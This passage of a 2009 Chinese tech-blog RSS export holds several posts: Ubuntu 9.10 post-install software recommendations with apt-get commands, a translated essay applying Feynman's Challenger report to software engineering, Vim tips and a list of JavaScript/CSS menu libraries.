2）文件名上有时间信息比较容易归档。有时候，文件包比较大，还需要对大文件进行分割（一般的压缩软件都支持文件分割）。<br>
3）使用wget和ftp可能会有用户名密码泄露的问题，使用ssh拷贝文件会比较好。<br>
4）源代码最好还是使用版本控制工具备份（比如Subversion或CVS）<br>
5）备份脚本可以放在计划任务（linux是corn）中以实际自动化。<br>
6）以上的方法一般说来比较适用于全部备份，而不是增量备份。</p>
<p>（全文完）<a href="http://topcat.hypermart.net/backup.html" target="_blank"></a></p>
 ]]></content>
<pubDate>2009-10-30T15:16:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/1640.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 装完Ubuntu 9.10后要干的事 ]]></title>
<link>https://coolshell.cn/articles/1644.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >Ubuntu 9.10刚刚release，就有人在网上发表了贴子告诉大家在装完这个操作系统后，还需要去安装的一些开源免费软件，相当丰富。不过，这个贴子的链接被GFW干掉了，所以，你需要使用Tor的支持，或是使用Google Reader才能查看<a href="http://blog.thesilentnumber.me/2009/09/top-things-to-do-after-installing.html" target="_blank">源文</a>（<a href="https://feeds.feedburner.com/TheSilentNumber" target="_blank">RSS链接</a>）。而这个贴子非常长，所以我无法作全文翻译，不过这个贴子的内容具有很强的指导意义，所以我在这里为大家总结一下该文所提到的那些诸多的东西。（关于那些如何翻墙的事情怎么做我就不多说了，网上有很多相关的文章，你自己搜索一下就可以找到）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C" title="基本工作">基本工作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E3%80%80" title="　">　</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8F%97%E9%99%90%E8%BD%AF%E4%BB%B6" title="受限软件">受限软件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%95%8C%E9%9D%A2%E7%9B%B8%E5%85%B3" title="界面相关">界面相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%A1%8C%E9%9D%A2%E7%9B%B8%E5%85%B3" title="桌面相关">桌面相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E9%9F%B3%E9%A2%91%E8%A7%86%E9%A2%91%E7%BC%96%E8%BE%91%E5%99%A8" title="音频/视频编辑器">音频/视频编辑器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%A4%9A%E5%AA%92%E4%BD%93Playback" title="多媒体Playback">多媒体Playback</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8" title="网页浏览器">网页浏览器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%B8%B8%E6%88%8F" title="游戏">游戏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%9B%BE%E7%89%87%E5%92%8C%E5%8F%91%E8%A1%8C%E7%89%A9" title="图片和发行物">图片和发行物</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E6%96%87%E4%BB%B6%E5%88%86%E4%BA%AB" title="文件分享">文件分享</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86" title="时间管理">时间管理</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#%E6%B2%9F%E9%80%9A%E8%BD%AF%E4%BB%B6" title="沟通软件">沟通软件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%AE%89%E5%85%A8%E5%92%8C%E9%9A%90%E7%A7%81" title="安全和隐私">安全和隐私</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E7%B3%BB%E7%BB%9F%E5%B7%A5%E5%85%B7" title="系统工具">系统工具</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C"></span>基本工作<span class="ez-toc-section-end"></span>
</h4>
<p>1）第一件事自然是下载那些Ubuntu的镜像站点表，以及更新操作系统的一些补丁。“系统”-&gt;“管理”-&gt; “更新管理器”。</p>
<p>2）第二件事是设置文件目录共享。就是在文件夹上点右键，在菜单中选“属性”，然后在对话框中选“共享”，那个对话框整得跟XP几乎一模一样。当然，这需要samba的支持。（sudo apt-get install samba）</p>
<p>3）接下来是设置时间同步。通过NTP（Network Time Protocol）同步你的时间。通过点击“系统”-&gt;“管理”-&gt; “时间/日期”，然后选择“Keep synchronized with Internet servers”（和Internet服务器同步），于是你需要安装NTP协议。（sudo apt-get install ntp）</p>
<p><span id="more-1644"></span></p>
<h4>
<span class="ez-toc-section" id="%E3%80%80"></span>　<span class="ez-toc-section-end"></span>
</h4>
<h4>
<span class="ez-toc-section" id="%E5%8F%97%E9%99%90%E8%BD%AF%E4%BB%B6"></span>受限软件<span class="ez-toc-section-end"></span>
</h4>
<p>1）DVD方面有一些受限的东西，所以，你可能需要安装libdvdcss，但首先你要安装libdvdread4。</p>
<p style="PADDING-LEFT: 30px">sudo apt-get install libdvdread4<br>
sudo /usr/share/doc/libdvdread4/install-css.sh</p>
<p>2）ubuntu-restricted-extras包中，包括了一堆Ubuntu不能合法使用的东西。比如：unrar，也就是解rar文件的程序，微软的Truetype字体，Sun JRE，还有一些受限代码，还有Adobe Flash Player，等等。这并不代表你不能安装，你可以通过“应用程序”-&gt;“Ubuntu软件中心”中安装。（sudo apt-get install ubuntu-restricted-extras）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E7%95%8C%E9%9D%A2%E7%9B%B8%E5%85%B3"></span>界面相关<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>GNOME Shell</strong>。关于这个无以言表的东西，你是无法拒绝的。（sudo apt-get install gnome-shell）</p>
<p>2）<strong>高级桌面效果</strong>。这就是所谓的3D桌面了，效果相当的炫。通过<em>System -&gt; Preferences -&gt; Appearance</em>来设置。在对话框中，选Extra。然后你就自己玩吧。使用Simple CompizConfig Settings Manager更容易一些。（sudo apt-get install simple-ccsm）</p>
<p>3）<strong>Basic Compositing</strong>。你是一个有图形界面狂燥症的人吗？如果的是话，你一定需要这个功能了（当然，硬件也得跟上）。按Alt+F2，然后运行gconf-editor，浏览Apps -》 metacity -&gt; general，然后，勾选compositing_manager……</p>
<p>4）<strong>Extra样式</strong>。这就啥也不说了，太多的效果了了，多得都没法说。（sudo apt-get install arc-colors community-themes gdm-themes gnome-backgrounds gnome-colors gnome-themes gnome-themes-extras gnome-themes-more metacity-themes shiki-colors zgegblog-themes）</p>
<p>5）<strong>Electric Sheep 屏保</strong>。这个屏保很炫啊。(sudo apt-get install electricsheep)</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E6%A1%8C%E9%9D%A2%E7%9B%B8%E5%85%B3"></span>桌面相关<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>Application Launcher</strong>。一个相当漂亮的程序启动器（sudo apt-get install gnome-do）</p>
<p>2）<strong>Universal Applets</strong>。许多的桌面小程序。（sudo apt-get install universal-applets）APT Line: APT line: deb http://download.opensuse.org/repositories/home:/some-guy:/screenlets/xUbuntu_9.04/ ./</p>
<p>3）<strong>剪贴板管理器</strong>。方便你的拷贝粘贴操作。（sudo apt-get install parcellite）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E9%9F%B3%E9%A2%91%E8%A7%86%E9%A2%91%E7%BC%96%E8%BE%91%E5%99%A8"></span>音频/视频编辑器<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>视频编辑器PiTiVi</strong>。功能相当强大。（sudo apt-get install pitivi）</p>
<p>2）<strong>视频捕捉Instanbul</strong>。（sudo apt-get install istanbul）</p>
<p>3）<strong>音频录制编辑器Jokosher</strong>。一个强大的非线性多音轨的录音和编辑器。（sudo apt-get install jokosher）</p>
<p>4）<strong>摄像头Cheese</strong>。基于GStreamer的一个摄像头程序（sudo apt-get install cheese）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E5%A4%9A%E5%AA%92%E4%BD%93Playback"></span>多媒体Playback<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>多媒体中心Moovida</strong>。原名是Elisa。一个很不错的家庭影院程序。（sudo apt-get install moovida）</p>
<p>2）<strong>视频Feed软件Miro</strong>。原名是Democracy Player。（sudo apt-get install miro）</p>
<p>3）<strong>媒体播放器Banshee</strong>。（sudo apt-get install banshee）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8"></span>网页浏览器<span class="ez-toc-section-end"></span>
</h4>
<p>Firefox 3.5就不多说了。</p>
<p>1）<strong>Google Chrome</strong>。（sudo apt-get install chromium-browser）</p>
<p>2）<strong>Epiphany</strong>。GNOME的集成浏览器。（sudo apt-get install epiphany-browser）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E6%B8%B8%E6%88%8F"></span>游戏<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>PlayDeb</strong>。<a href="http://blog.thesilentnumber.me/2009/07/playdebnet-beta-2-launches.html">PlayDeb</a>是一个游戏库。通过PlayDeb.net安装游戏是相当简单和方便的。你可以把其加到你的源里<a href="http://archive.getdeb.net/install_deb/playdeb_0.3-1~getdeb1_all.deb">playdeb package</a>。（wget -O- http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add -）</p>
<p>2）<strong>Yo Frankie!</strong>。这个大名鼎鼎的游戏我就不介绍了。（sudo apt-get install yofrankie）</p>
<p>3）<strong>Nexuiz</strong>。第一人称视角射击类的游戏。（sudo apt-get install nexuiz）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%BE%E7%89%87%E5%92%8C%E5%8F%91%E8%A1%8C%E7%89%A9"></span>图片和发行物<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>图片管理器Solang</strong>。F-Spot做得并不令人满意，你可以试试这个最新的管理器。（sudo apt-get install solang）</p>
<p>2）<strong>向量图Inkscape</strong>。SVG文件格式，很像Illustrator, CorelDraw。（sudo apt-get install inkscape）</p>
<p>3）<strong>3D图片Blender</strong>。相当不错的一个3D图创建器。<a href="https://en.wikipedia.org/wiki/Blender_Foundation#Open_Movie_Project">Open Movie Project</a>的一部分。（sudo apt-get install blender）</p>
<p>4）发<strong>行物编辑器Scribus</strong>。你可以用这个软件来制作一些报纸，小册子，卡片，海报，封面等发行物。（sudo apt-get install scribus）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E4%BB%B6%E5%88%86%E4%BA%AB"></span>文件分享<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>P2P软件Gnunet</strong>。一个MP3的P2P分享软件（sudo apt-get install gnunet-gtk）</p>
<p>2）<strong>直连DC++。</strong>最好的方式就是直接。DC++是这其中最好的。（sudo apt-get install linuxdcpp）</p>
<p>3）<strong>Usenet – LottaNZB</strong>。虽然不是名费的，但Usenet下载是奇快无比。LottaNZB是其中一个client。（sudo apt-get install lottanzb）</p>
<p>4）<strong>BT下载Deluge</strong>。功能齐全的BT客户端。（sudo apt-get install deluge）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86"></span>时间管理<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>Alarm Clock</strong>。一个日历提醒程序。（sudo apt-get install alarm-clock）</p>
<p>2）<strong>时间跟踪Hamster</strong>。这个小程序可以统计你操作不同程序的时间。（sudo apt-get install hamster-applet）</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E6%B2%9F%E9%80%9A%E8%BD%AF%E4%BB%B6"></span>沟通软件<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>即时聊天Empathy</strong>。</p>
<p>2）<strong>微博写作器Gwibber</strong>。可以用于Twitter, Identi.ca, Jaiku, Facebook, Digg等等。（sudo apt-get install gwibber）</p>
<p>3）<strong>QQ 和 Skype</strong>。这是我加上的，你可以在QQ的网上下载Linux版，很不错。还有Skype。</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E5%AE%89%E5%85%A8%E5%92%8C%E9%9A%90%E7%A7%81"></span>安全和隐私<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>On-The-Fly 加密</strong>。<a href="http://sd4l.sourceforge.net/">http://sd4l.sourceforge.net/</a></p>
<p>2）<strong>VPN访问</strong>。sudo apt-get install network-manager-pptp</p>
<p>3）<strong>Onion Routing</strong>。这个软件中最著名的就是我在文章前提到过的Tor，那个可以绕过GFW的软件。（sudo apt-get install tor tor-geoipdb）</p>
<p>4）<strong>防火墙</strong>。sudo apt-get install gufw</p>
<p>5）<strong>杀毒软件ClamAV</strong>。sudo apt-get install clamtk</p>
<p>　</p>
<h4>
<span class="ez-toc-section" id="%E7%B3%BB%E7%BB%9F%E5%B7%A5%E5%85%B7"></span>系统工具<span class="ez-toc-section-end"></span>
</h4>
<p>1）<strong>LiveUSB Creator</strong>。想用USB启动你的电脑吗？用UNetbootin这个工具吧。（sudo apt-get install unetbootin）</p>
<p>2）<strong>备份工具Back In Time</strong>。sudo apt-get install backintime-gnome</p>
<p>3）<strong>磁盘分区工具</strong>。GNOME Partition Editor可以帮你管理你的USB，IPOD或其它可写存储（sudo apt-get install gparted）</p>
<p>4）<strong>虚拟机VirtualBox</strong>。这个开源的虚拟机，还不错。sudo apt-get install virtualbox-3.0</p>
<p> </p>
<p>好了，基本上就是这些，我要说，没有图片的支持，看来这篇文章不怎么的。呵呵。不过希望你喜欢。也希望你给我们推荐你所喜欢的Ubuntu工具。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-10-30T19:10:47+08:00</pubDate>
<guid>https://coolshell.cn/articles/1644.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Richard Feynman, 挑战者号, 软件工程 ]]></title>
<link>https://coolshell.cn/articles/1654.html</link>
<content><![CDATA[ 
<p style="TEXT-ALIGN: left">源文：<a href="http://duartes.org/gustavo/blog/post/richard-feynman-challenger-disaster-software-engineering" target="_blank">链接</a>  （本文主要根据挑战者号的问题，以及Richard Feynman那对NASA严厉的批评报告，批评了不适当的“自顶向下”的设计方法，并总结了一下软件工程和其它工程的相通的一些观点。翻译水平有限，欢迎指正）</p>
<p align="center"><img alt="image placeholder" ></p>
<p>佛罗里达州，美国东部时间1986年1月28日上午11时39分，<a href="https://zh.wikipedia.org/wiki/%E6%8C%91%E6%88%98%E8%80%85%E5%8F%B7%E8%88%AA%E5%A4%A9%E9%A3%9E%E6%9C%BA%E7%81%BE%E9%9A%BE">挑战者号航天飞机</a> 执行为期6天的<a href="https://en.wikipedia.org/wiki/STS-51-L">STS-51-L 任务</a>，在发射后，其右侧固体火箭助推器（SRB – <a href="https://en.wikipedia.org/wiki/Space_Shuttle_Solid_Rocket_Booster">Solid Rocket Booster</a>）的O型环密封圈（用于连接两节助推器）失效，泄漏出来的热汽达到了5000华氏度，直接蒸发了O型密封圈，并灼烧了毗邻的外部燃料舱，在几秒钟内，外部燃料舱出现结构连接失效，空气的动力迅速分解了航天飞机。在而航天飞机上升72秒以后，助推器脱落，导致航天发飞向侧面滑出。几乎在引航员 Michael J. Smith 发出”Uh oh” 的同时，整个航天飞机完全解体，片刻，航天飞机内部发生爆炸，所有7名宇航员罹难。 那时的我还只是一个小孩，我从电视下方滚动的新闻条目知道了这一惨剧。</p>
<p>在那个时候，火箭助推器工程师曾经警告过这个O型环可能存在问题，但可惜的是，NASA的管理层忽略了这个问题。<img alt="image placeholder" >美国总统里根委派<a href="https://en.wikipedia.org/wiki/Rogers_Commission" target="_blank">罗杰斯委员会</a>对事故进行了调查，调查成员包括著名的物理学家Richard Feynman。其不羁的态度和直来直去的方法和罗杰斯委员会的风格形成了鲜明的反差。主席罗杰斯，一个政客，评论Feynman是一个“真正的痛苦”。最后，在委员会提交的报告中，Feynman反判的观点几乎被清除了出去。并且，Feynman曾被主席威胁过要把他的名字从报告中完全除掉，但最终，他们还是同意在报告中加一个附录，但只是个人观点—— <a href="http://www.ralentz.com/old/space/feynman-report.html">Appendix F – Personal Observations on Reliability of Shuttle</a>。</p>
<p><span id="more-1654"></span></p>
<p>这是一个好的报告，因为，这是一个富有才华的报告。其深深地洞察了在实现一些高可靠性的系统时的工程学中的一些很自然性的东西。是的，在这里，我并没有放上“软件工程” 的字样，只是工程。但Feynman的结论却非常和我们的软件开发有着不可分割的关系。这是最基本的东西，无论是软件工程，还是别的工程学。下面，让我们来看看，Feynman是怎么说的：</p>
<blockquote><p>航天飞机主引擎的建造方式是<a href="https://en.wikipedia.org/wiki/Top-down"><strong>自顶向下</strong></a>(top down)，我们可以这样说。整个引擎被设计把所有的事情放在一起，而那些相关的细节上的东西在设计当时还并不是很成熟的。所以，<strong>当其中的小零件（轴承，涡轮片，散热管，等等）出现问题时</strong>，<strong>我们需要花费昂贵的代价才能找到事故的原因，也很难作出修改</strong>。要避免问题发生，需要频繁的维护和置换重要的零部件。修理很多时候不会解决真正的原因。</p></blockquote>
<p>可见，软件开发中也一样，Bug在整个过程中存在的时间越长， <a href="http://stevemcconnell.com/ieeesoftware/eic17.htm">我们就越难解决这个问题</a>。很显然，自顶向下的方法，因为在设计的时候并不熟悉实际问题，所以，Bug从设计的时候就出现了。然而，我们需要明白，需求和设计的不同之处。需求需要对产品一种清楚和良好的定义，设计则是解决如何达到需求的方法。Feynman 在这里并没有反对 <a href="http://www.joelonsoftware.com/articles/fog0000000036.html">功能规格说明书</a>，他只是反对自顶向下的设计方法，比如： <a href="http://martinfowler.com/bliki/UmlAsBlueprint.html">UML 就是蓝图</a> 的鼓吹者。再来看看他的言论：</p>
<blockquote><p>航天飞机主引擎是一个非常不同寻常的机器，它和以前所有的引擎都不一样。这完全超出了以前引擎制的工程经验。所以，不奇怪的，许多不同的流程和难点都会在工程中出现。<strong>然而，很不幸地，这是通过自顶向下设计，所以，那些流程和问题是很难被发现被修正的</strong>。设计要求的引擎寿命可以完成55次点火任务（相当于27,000秒的操作，也就是说，第次点火需要500秒），但事实上这并没有完成。而引擎现在则<strong>需要频繁维护，并需要经常更换重要的部件</strong>，比如：涡轮泵，轴承，金属片，等等。</p></blockquote>
<p align="center"><img alt="image placeholder" ></p>
<p>“不合适的自顶向下的设计方式，导致了问题很难去发现和修正，最终没有完成设计需求，频繁性地维护”这些描述方式，听起来是不是似曾相识？我们每天在做的软件工程和这个不一样吗？Feynman 详细说明了为什么“自顶向下”的设计会让发现和解决这些问题成为那么的难和痛苦的一件事：</p>
<blockquote><p>很多这些已被解决的问题在一开始设计时都是设计的难点。很自然地，没有人可以确定那些所有的已发现问题都能会出现，而其中一些，<strong>我们并没有根据正确的原因在正确的地方解决这些问题</strong>。</p></blockquote>
<p>无论这是Linux内核，或是航天飞机引擎，这些设计时的基本的问题都是相通的。而“自顶向下”是其中荒唐的一个，因为，自顶向下，过度的注重了需求而忽略了现实，而那些下面非常细节的知识绝对是非常需要的，并不是所有的东西都可以抽象成出来。在他说起航空电子系统时（一个NASA的另一个部门）：</p>
<blockquote><p>该软件是采用了从底向上的方法被小心地做了检查。<strong>首先，每一行代码都被检查过，然后，代码段和模块和一些详细的功能被验证过</strong>。而检查范围在一步一步地被扩大，直到新的改变被组合进来最终成为一个完整的系统。这个过程最终的完整的输出成为了最终的产品，成为了新的release。这个部门完全以一种中立的态度，<strong>把软件作为一个敌对方</strong>，不停地测试，校验，就像自己就是这个软件的用户一样。</p></blockquote>
<p>是的，这就是1986年Feynman告诉大家的——Unit Test（单元测试），今天，Unit Test成为了软件开发活动中最最重要的一个环节（也许你以为是Coding）。并不单单只是Unit Test，“步步为营的增量式”和“以敌对的态度”，都是值得我们所学习的。我们经常听到有人在抱怨软件道，因为软件工程还太年轻了，还有很多知识我们还没有得到，所以总是那么多问题。这完全是胡说！我们痛苦是因为，我们 <a href="http://www.stevemcconnell.com/cc.htm">总是忽略</a> 早就确定了的， <a href="http://www.joelonsoftware.com/articles/fog0000000043.html">早为人所熟知</a>， <a href="http://www.stevemcconnell.com/rd.htm">以经历和实践去证明一切的方法</a>。 当然，在这方面，我们的管理层也需要负责，尤其是那些紊乱的时间进度，错误的激励机制，低档次的招聘，和一些让士气受挫的制度，等等。“管理”和“工程”间的紧张关系最终成为了糟糕的管理。Feynman在他的报告中也谈到了这点，下面其中的一小段话：</p>
<blockquote><p>总而言之，计算机软件检查系统和<strong>最负责的态度</strong>。是的，那里并没有那种自欺欺人而不顾固体燃料助推器的标准。但可以肯定的是，有关管理部门<strong>最新的建议，建议取消此类复杂而昂贵的不必要的测试</strong>。</p></blockquote>
<p>这只是其中的一个小段。我把其挑出来是因为其一针见血地指出了观点，比如“最负责的态度”，以及“逐步的自欺欺人”。我建议你读一读<a href="http://www.ralentz.com/old/space/feynman-report.html">报告全文</a>， 可以让你得到很多真相。关于软件工程，下面是几个主要观点：</p>
<ul>
<li>工程仅当在和其管理有好的关系的时候才能好。</li>
<li>大型的从上从前端的设计是愚蠢的。</li>
<li>软件工程和其它传统的工程学是一样的。</li>
<li>可靠的系统由几近残酷的测试，增量式的自底向上的工程，以及高负责的态度来共同保证。</li>
</ul>
<p>这篇报告中，还有很多不错的观点，如果你感受到了，欢迎你告诉我。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-11-04T16:49:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/1654.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ VIM有趣的命令 ]]></title>
<link>https://coolshell.cn/articles/1651.html</link>
<content><![CDATA[ 
<p>前几天逛豆瓣，发现了VIM一个有趣的小技巧。</p>
<p>在VIM中输入:h!试试看会发现什么。</p>
<p>再输入:h 42呢？又会有什么发现？</p>
 ]]></content>
<pubDate>2009-11-04T19:05:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/1651.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 13个不错的Javascript和CSS的菜单 ]]></title>
<link>https://coolshell.cn/articles/1660.html</link>
<content><![CDATA[ 
<p>以前发布过两篇文章——“<a rel="bookmark" href="https://coolshell.cn/articles/562.html">30种时尚的CSS网站导航条</a>”和“<a rel="bookmark" href="https://coolshell.cn/articles/918.html">20个优秀的Javascript导航技术</a>”，今天向大家介绍一下，13个不错的Javascript和CSS的菜单。</p>
<p>1) <a href="http://www.andrewsellick.com/35/sexy-sliding-javascript-side-bar-menu-using-mootools">性感的滑动型菜单</a> </p>
<p><a href="http://www.andrewsellick.com/35/sexy-sliding-javascript-side-bar-menu-using-mootools"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.andrewsellick.com/examples/sliding-side-bar/" target="_blank">Mootols Version</a><br>
演示：<a title="Demo" href="http://www.andrewsellick.com/examples/sliding-side-bar-scriptaculous/" target="_blank">Script.aculo.usVersion</a></p>
<p> </p>
<p><span id="more-1660"></span></p>
<hr class="dotted">2) <a href="http://labs.activespotlight.net/jQuery/menu_demo.html">FastFind 菜单</a> 右键菜单，还可以被拖来拖去。使用 <em>jQuery</em> 。
<p><a href="http://labs.activespotlight.net/jQuery/menu_demo.html"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://labs.activespotlight.net/jQuery/menu_demo.html" target="_blank">FastFind Menu</a></p>
<p> </p>
<hr class="dotted">3) <a href="http://2210media.com/dock_menu/">Webber 2.0 Dock 菜单</a>
<p><a href="http://2210media.com/dock_menu/"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://2210media.com/dock_menu/" target="_blank">Webber 2.0 Dock Menu</a></p>
<p> </p>
<hr class="dotted">4) <a href="http://www.phatfusion.net/">Phatfusion- 图片菜单</a> 使用了onClick 事件来 open 和 close 菜单项。
<p><a href="http://www.phatfusion.net/imagemenu/index.htm"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.phatfusion.net/imagemenu/index.htm" target="_blank">Phatfusion- Image Menu</a><br>
演示： <a title="Demo" href="http://www.artviper.de/ImageMenu/" target="_blank">Mootools version with XML parser</a></p>
<p> </p>
<hr class="dotted">5) <a href="http://extjs.com/deploy/dev/examples/tree/reorder.html">可拖动的树形菜单</a>
<p> <a href="http://extjs.com/deploy/dev/examples/tree/reorder.html"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://extjs.com/deploy/dev/examples/tree/reorder.html" target="_blank">Drag and Drop ordering in a TreePanel</a></p>
<p> </p>
<hr class="dotted">6) <a href="http://www.thinkvitamin.com/">自定义的菜单事件</a>
<p><a href="http://www.thinkvitamin.com/misc/yui-demos/demo-10.html"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.thinkvitamin.com/misc/yui-demos/demo-10.html" target="_blank">Custom Menu Events | ThinkVitamin.com</a></p>
<p> </p>
<hr class="dotted">7) <a href="http://yura.thinkweb2.com/scripting/contextMenu/">右键菜单 </a>
<p><a href="http://yura.thinkweb2.com/scripting/contextMenu/"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://yura.thinkweb2.com/scripting/contextMenu/" target="_blank">Context Menu Functionality</a><br>
演示：<a title="demo" href="http://utils.softr.net/contextmenoo-menu-contextual-con-mootools/" target="_blank">Another Context Menu</a></p>
<p> </p>
<hr class="dotted">8 ) <a href="http://gmarwaha.com/blog/?p=7">LavaLamp jQuery 滑动菜单 </a>
<p><a href="http://gmarwaha.com/blog/?p=7"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://gmarwaha.com/blog/?p=7" target="_blank">LavaLamp jQuery Sliding Menu</a><br>
演示： <a title="Demo" href="http://devthought.com/cssjavascript-true-power-fancy-menu/" target="_blank">Mootools Fancy Menu</a></p>
<p> </p>
<hr class="dotted">9 ) <a href="http://www.dynamicdrive.com/dynamicindex1/slashdot.htm">折叠式菜单</a>
<p><a href="http://www.dynamicdrive.com/dynamicindex1/slashdot.htm"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.dynamicdrive.com/dynamicindex1/slashdot.htm" target="_blank">Slashdot Menu</a></p>
<p> </p>
<hr class="dotted">10 ) <a href="http://www.artviper.eu/mootoolsmenu/" target="new">Mootools层叠式菜单</a>
<p><a href="http://www.artviper.eu/mootoolsmenu/" target="new"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.artviper.eu/mootoolsmenu/" target="new">Mootools menu with Accordeon and Effects</a></p>
<p> </p>
<hr class="dotted">11 ) <a href="http://www.ndesign-studio.com/blog/mac/css-dock-menu" target="new">CSS Dock 菜单</a> 模仿Mac 电脑界面。 
<p><a href="http://www.ndesign-studio.com/blog/mac/css-dock-menu" target="new"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.ndesign-studio.com/blog/mac/css-dock-menu" target="new">CSS Dock Menu</a></p>
<p> </p>
<hr class="dotted">12 ) <a href="http://www.getintothis.com/pub/projects/rb_menu/" target="new">jQuery 插件：滑动式菜单</a>
<p><a href="http://www.getintothis.com/pub/projects/rb_menu/" target="new"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.getintothis.com/pub/projects/rb_menu/" target="new">jQuery Plugin: Sliding Menu</a></p>
<p> </p>
<hr class="dotted">13 ) <a href="http://www.456bereastreet.com/archive/200705/accessible_expanding_and_collapsing_menu/" target="new">折叠式菜单</a>
<p><a href="http://www.456bereastreet.com/lab/accessible-expanding-collapsing-menu/" target="new"><img alt="image placeholder" ></a></p>
<p>演示： <a title="Demo" href="http://www.456bereastreet.com/lab/accessible-expanding-collapsing-menu/" target="new">Accessible expanding and collapsing menu</a></p>
<p>文章：<a href="http://9tricks.com/web-dev/13-awesome-javascript-css-menus/" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2009-11-04T19:23:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/1660.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Vim的分屏功能 ]]></title>
<link>https://coolshell.cn/articles/1679.html</link>
<content><![CDATA[ 
<p>本篇文章主要教你如何使用 <a href="https://www.vim.org/">Vim</a> 分屏功能。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><span id="more-2645"> <img alt="image placeholder" ><span id="more-1679"></span></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
